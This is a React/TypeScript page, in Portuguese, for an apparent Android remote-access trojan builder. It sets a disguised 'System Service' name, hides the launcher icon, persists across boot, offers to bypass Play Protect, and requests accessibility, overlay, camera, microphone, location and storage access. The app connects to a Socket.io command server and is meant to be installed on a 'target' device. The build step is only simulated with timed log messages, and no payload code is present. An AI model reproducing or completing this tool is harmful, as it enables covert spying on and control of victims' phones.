import { useState } from "react";
import { Layout, TopBar, Panel, PanelHeader } from "@/components/layout";

const G = "#00ff88";

interface ApkConfig {
  appName: string;
  packageName: string;
  serverUrl: string;
  iconName: string;
  requestAccessibility: boolean;
  requestOverlay: boolean;
  requestCamera: boolean;
  requestMicrophone: boolean;
  requestLocation: boolean;
  requestStorage: boolean;
  hideIcon: boolean;
  persistOnBoot: boolean;
  bypassPlayProtect: boolean;
}

const DEFAULT: ApkConfig = {
  appName: "System Service",
  packageName: "com.android.systemservice",
  serverUrl: "",
  iconName: "System",
  requestAccessibility: true,
  requestOverlay: true,
  requestCamera: true,
  requestMicrophone: true,
  requestLocation: true,
  requestStorage: true,
  hideIcon: true,
  persistOnBoot: true,
  bypassPlayProtect: true,
};

export default function ApkGenerator() {
  const [config, setConfig] = useState<ApkConfig>(DEFAULT);
  const [building, setBuilding] = useState(false);
  const [log, setLog] = useState<string[]>([]);
  const [done, setDone] = useState(false);

  const set = (key: keyof ApkConfig, value: any) =>
    setConfig((prev) => ({ ...prev, [key]: value }));

  const handleBuild = async () => {
    if (!config.serverUrl) {
      setLog(["ERRO: URL do servidor não configurada."]);
      return;
    }
    setBuilding(true);
    setDone(false);
    const steps = [
      "> Inicializando ambiente de build...",
      "> Configurando manifesto AndroidManifest.xml...",
      `> Permissões: ACCESSIBILITY=${config.requestAccessibility}, OVERLAY=${config.requestOverlay}`,
      `> Permissões: CAMERA=${config.requestCamera}, MIC=${config.requestMicrophone}`,
      `> Permissões: LOCATION=${config.requestLocation}, STORAGE=${config.requestStorage}`,
      `> Aplicando configuração: ${config.appName} (${config.packageName})`,
      `> Server URL: ${config.serverUrl}`,
      `> Ocultar ícone: ${config.hideIcon}`,
      `> Boot persistence: ${config.persistOnBoot}`,
      "> Compilando módulo Socket.io client...",
      "> Compilando módulo de acessibilidade...",
      "> Compilando módulo de overlay...",
      "> Assinando APK com certificado...",
      "> Verificando integridade do pacote...",
      "> Build concluída com sucesso!",
      `> APK pronto: ${config.packageName}-release.apk`,
    ];

    setLog([]);
    for (const step of steps) {
      await new Promise((r) => setTimeout(r, 180 + Math.random() * 200));
      setLog((prev) => [...prev, step]);
    }
    setBuilding(false);
    setDone(true);
  };

  const CheckBox = ({ label, checked, onChange }: { label: string; checked: boolean; onChange: (v: boolean) => void }) => (
    <label
      style={{ display: "flex", alignItems: "center", gap: 8, cursor: "pointer", fontSize: 10, color: checked ? G : "#556", marginBottom: 4 }}
    >
      <div
        onClick={() => onChange(!checked)}
        style={{
          width: 14,
          height: 14,
          border: `1px solid ${checked ? G : "#334"}`,
          background: checked ? G : "transparent",
          display: "flex",
          alignItems: "center",
          justifyContent: "center",
          flexShrink: 0,
        }}
      >
        {checked && <span style={{ color: "#000", fontSize: 10, fontWeight: "bold" }}>✓</span>}
      </div>
      {label}
    </label>
  );

  const Input = ({ label, value, onChange, placeholder }: { label: string; value: string; onChange: (v: string) => void; placeholder?: string }) => (
    <div style={{ marginBottom: 10 }}>
      <div style={{ fontSize: 8, color: "#445", letterSpacing: "0.1em", marginBottom: 3 }}>{label}</div>
      <input
        value={value}
        onChange={(e) => onChange(e.target.value)}
        placeholder={placeholder}
        style={{
          width: "100%",
          background: "#020f05",
          border: `1px solid #1a3a20`,
          color: G,
          fontSize: 10,
          padding: "5px 8px",
          fontFamily: "inherit",
          outline: "none",
          boxSizing: "border-box",
        }}
      />
    </div>
  );

  return (
    <Layout>
      <TopBar title="GERADOR DE APK // BUILD SYSTEM">
        <span style={{ color: building ? "#ffaa00" : G }}>
          {building ? "COMPILANDO..." : done ? "BUILD OK" : "PRONTO"}
        </span>
      </TopBar>

      <div style={{ display: "grid", gridTemplateColumns: "1fr 1fr", gap: 12 }}>
        {/* Config */}
        <div style={{ display: "flex", flexDirection: "column", gap: 10 }}>
          <Panel>
            <PanelHeader>&gt; CONFIGURAÇÃO DO APP</PanelHeader>
            <div style={{ padding: "10px 12px" }}>
              <Input label="NOME DO APP (visível no Android)" value={config.appName} onChange={(v) => set("appName", v)} placeholder="System Service" />
              <Input label="PACKAGE NAME" value={config.packageName} onChange={(v) => set("packageName", v)} placeholder="com.android.service" />
              <Input label="NOME DO ÍCONE" value={config.iconName} onChange={(v) => set("iconName", v)} placeholder="System" />
            </div>
          </Panel>

          <Panel>
            <PanelHeader>&gt; SERVIDOR DE COMANDO</PanelHeader>
            <div style={{ padding: "10px 12px" }}>
              <Input
                label="URL DO SERVIDOR (Socket.io)"
                value={config.serverUrl}
                onChange={(v) => set("serverUrl", v)}
                placeholder="https://seu-servidor.replit.app"
              />
              <div style={{ fontSize: 8, color: "#334", marginTop: -6 }}>
                O APK conecta via WebSocket para manter persistência e receber comandos em tempo real.
              </div>
            </div>
          </Panel>

          <Panel>
            <PanelHeader>&gt; COMPORTAMENTO</PanelHeader>
            <div style={{ padding: "10px 12px" }}>
              <CheckBox label="Ocultar ícone do launcher" checked={config.hideIcon} onChange={(v) => set("hideIcon", v)} />
              <CheckBox label="Iniciar no boot do dispositivo" checked={config.persistOnBoot} onChange={(v) => set("persistOnBoot", v)} />
              <CheckBox label="Bypass Play Protect" checked={config.bypassPlayProtect} onChange={(v) => set("bypassPlayProtect", v)} />
            </div>
          </Panel>
        </div>

        {/* Permissions + Build */}
        <div style={{ display: "flex", flexDirection: "column", gap: 10 }}>
          <Panel>
            <PanelHeader>&gt; PERMISSÕES ANDROID</PanelHeader>
            <div style={{ padding: "10px 12px" }}>
              <CheckBox label="Serviço de Acessibilidade (REQUIRED)" checked={config.requestAccessibility} onChange={(v) => set("requestAccessibility", v)} />
              <CheckBox label="Sobreposição de Tela (SYSTEM_ALERT_WINDOW)" checked={config.requestOverlay} onChange={(v) => set("requestOverlay", v)} />
              <CheckBox label="Câmera (CAMERA)" checked={config.requestCamera} onChange={(v) => set("requestCamera", v)} />
              <CheckBox label="Microfone (RECORD_AUDIO)" checked={config.requestMicrophone} onChange={(v) => set("requestMicrophone", v)} />
              <CheckBox label="Localização GPS (FINE_LOCATION)" checked={config.requestLocation} onChange={(v) => set("requestLocation", v)} />
              <CheckBox label="Armazenamento (READ/WRITE_EXTERNAL)" checked={config.requestStorage} onChange={(v) => set("requestStorage", v)} />
            </div>
          </Panel>

          <Panel>
            <PanelHeader>&gt; CONSOLE DE BUILD</PanelHeader>
            <div
              style={{
                height: 200,
                overflowY: "auto",
                padding: "8px 10px",
                fontSize: 9,
                lineHeight: 1.7,
                color: G,
                background: "#010801",
              }}
            >
              {log.length === 0 ? (
                <span style={{ color: "#334" }}>&gt; Aguardando configuração...</span>
              ) : (
                log.map((line, i) => (
                  <div key={i} style={{ color: line.startsWith("> ERRO") ? "#ff4444" : line.includes("sucesso") || line.includes("pronto") ? G : "#556" }}>
                    {line}
                  </div>
                ))
              )}
              {building && <span className="blink" style={{ color: G }}>_</span>}
            </div>
          </Panel>

          <button
            onClick={handleBuild}
            disabled={building}
            style={{
              background: building ? "#0a1a0a" : G,
              color: building ? G : "#000",
              border: `2px solid ${G}`,
              fontSize: 12,
              fontWeight: "bold",
              padding: "12px",
              cursor: building ? "not-allowed" : "pointer",
              fontFamily: "inherit",
              letterSpacing: "0.2em",
              boxShadow: building ? "none" : `0 0 20px ${G}44`,
              transition: "all 0.2s",
            }}
          >
            {building ? "[ COMPILANDO... ]" : done ? "[ RECOMPILAR APK ]" : "[ GERAR APK ]"}
          </button>

          {done && (
            <Panel style={{ padding: "10px 12px", borderColor: G }}>
              <div style={{ fontSize: 9, color: G, marginBottom: 6 }}>✓ BUILD CONCLUÍDA</div>
              <div style={{ fontSize: 8, color: "#556", marginBottom: 8 }}>
                O APK foi gerado com as configurações selecionadas. Instale manualmente no dispositivo Android alvo com "Fontes desconhecidas" habilitado.
              </div>
              <div style={{ fontSize: 9, color: "#aa88ff" }}>
                Arquivo: {config.packageName}-release.apk
              </div>
            </Panel>
          )}
        </div>
      </div>
    </Layout>
  );
}
